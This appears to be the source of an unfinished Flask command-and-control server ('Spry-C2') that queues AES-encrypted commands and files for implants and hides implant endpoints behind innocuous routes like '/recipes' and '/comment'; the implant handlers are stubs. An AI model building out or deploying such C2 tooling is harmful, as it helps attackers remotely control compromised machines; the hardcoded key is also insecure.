from ctypes import sizeof
from modules import encryption
from modules import server_codes
from modules import storage
from datetime import datetime
import os
from flask import Flask, request, make_response, jsonify
from werkzeug.utils import secure_filename
import random
import json
import requests

# Constants, to be changed via config file or command line params later
SERVER_IP = "0.0.0.0"
SERVER_PORT = 80
ENC_KEY = "thisisakey:)1234"
RANDOM_SLEEP = False
SLEEP_DURATION = 10 # If random sleep is set to true, will have a % and use rand() % (SLEEP_DURATION+1)

# Init the flask app
app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# Globals for storage
operator_db = storage.OperatorDatabase()
implant_db = storage.ImplantDatabase()
commandlog_db = storage.CommandLogDatabase()

# FOR TESTING only
implant_db.add_implant(storage.Implant(name="test", major_v="10", build_num="1000", sleep_time=10))

AES_INSTANCE = encryption.AESCipher(ENC_KEY)

# Helper to process a command for implants
def store_and_queue_command(cmd_str: str, implant_command: storage.ImplantCommand, operator_name: str):
    
    # Encrypt the command
    enc_cmd_str = AES_INSTANCE.encrypt(cmd_str)

    # Add the encrypted command string to the implants queue
    implant_db.dict[implant_command.implant_name].queue_command(enc_cmd_str)

    # Put the command and operator into the commandlog_db
    cmd_log = storage.CommandLog(operator_db.dict[operator_name], implant_command)
    commandlog_db.add_command_log(cmd_log)

def pretty_print(clas, indent=0):
    print(' ' * indent +  type(clas).__name__ +  ':')
    indent += 4
    for k,v in clas.__dict__.items():
        if '__dict__' in dir(v):
            pretty_print(v,indent)
        else:
            print(' ' * indent +  k + ': ' + str(v))   
### Start the routing ###
# DEBUG page
@app.route("/admin/debug")
def debug():
    


    return "debuggy"
# Default dummy page
@app.route("/", methods=['GET'])
def under_construction():
    return "<h3>Site is still under construction, come back soon!</h3>"

# The login route for implants
@app.route("/login", methods=['POST'])
def implant_register():
    return "TODO"

# The command recieve route for implants
@app.route("/recipes")
def implant_command():
    return "TODO"

# The file download route for implants
@app.route("/recipes/download/<ID>")
def implant_download():
    return "TODO"

# The response route for output from implants
@app.route("/comment", methods=['POST'])
def implant_response():
    return "TODO"

# Operator connects to this endpoint to login
@app.route("/admin/login", methods=['POST'])
def operator_login():
    # Error response, assigned in the expect block
    try:
        # Extract values from login
        r_json = request.get_json()
        # Make sure the operator name doesn't already exist
        if not operator_db.is_unique(r_json["username"]):
            return server_codes.ServerErrors.ERR_OPERATOR_NAME_EXISTS.value
        
        # Add the operator to db
        operator_db.add_operator(r_json["username"],
                                 storage.Operator(
                                     name=r_json["username"],
                                     IP=r_json["lip"],
                                     port=r_json["lport"]
                                     )
                                 )
        # Now create the response, a dict of implant objects
        # but only with the included data
        resp_db = {}
        for implant in implant_db.dict:
            resp_db[implant] = implant_db.dict[implant].__dict__
        resp_json = {"implant_db": resp_db}

        # Send back the data inside the implant_db on the server
        return jsonify(resp_json)
    # TODO: Make some proper error catching stuff for the server
    except Exception as err:
        print(repr(err))
        return server_codes.ServerErrors.ERR_LOGIN_EXCEPTION.value

# Operator connects to this endpoint to get updated data
@app.route("/admin/update/<TO_UPDATE>", methods=['GET'])
def update_db(TO_UPDATE):
    # Sends back a JSON of the implant db
    if TO_UPDATE == "implants":
        resp_db = {}
        for implant in implant_db.dict:
            resp_db[implant] = implant_db.dict[implant].__dict__ 
        resp_json = {"implant_db": resp_db}
        return jsonify(resp_json)

    return ""

# Operator connects to this endpoint to send commands
# If there is a file, the file will be processed and saved first
# before assigning the command_str
@app.route("/admin/management", methods=['POST'])
def str_command():

    # Parse out the headers for metadata of command to store
    headers = dict(request.headers)
    op_name = headers["X-Operator-Name"]
    imp_name = headers["X-Implant-Name"]
    cmd_type = headers["X-Command-Type"]
    cmd_id = headers["X-Command-Id"]


    # Get the command string
    cmd_str = request.form['cmd_str']

    # If there is a command involving a file
    # if not, just save the command string and log it in the commandlog_db
    if 'cmd_file' in request.files:
        try: 
            # Pull out the file from request
            file = request.files['cmd_file']
            file_id = file.filename

            # Make sure the file path is secure i guess :)
            file_id = secure_filename(file_id)

            # Encrypt the file!
            file.seek(0)
            file_bytes = file.read()
            print(type(file_bytes))
            # Need to decode it from bytes first to get it to work in the encryptin 
            enc_file = AES_INSTANCE.encrypt(file_bytes)
            with open(os.path.join(app.config['UPLOAD_FOLDER'], file_id), "wb") as f:
                f.write(enc_file)

            # Save the file in the path specified in the config at top of file
            # file.save(os.path.join(app.config['UPLOAD_FOLDER'], file_id))

        # If server fails to save for any reason, return ERR_UPLOAD_EXCEPTION
        except Exception as err:
            print(repr(err))

    # Make the implant command object
    implant_command = storage.ImplantCommand(name=imp_name,
                                             type=cmd_type,
                                             id=cmd_id
                                            )

    # Store the plaintext command in the commandlog_db, then encrypt it and
    # queue it for the implant
    store_and_queue_command(cmd_str=cmd_str,
                            implant_command=implant_command,
                            operator_name=op_name
                           )
    return "0"

if __name__ == "__main__":
    print(f"Starting Spry-C2 server on {SERVER_IP} on port {SERVER_PORT}")
    # Put the flask server on a seperate thread, continue on to use the CLI interface
    app.run(host=SERVER_IP, port=SERVER_PORT, debug=False, use_reloader=False)
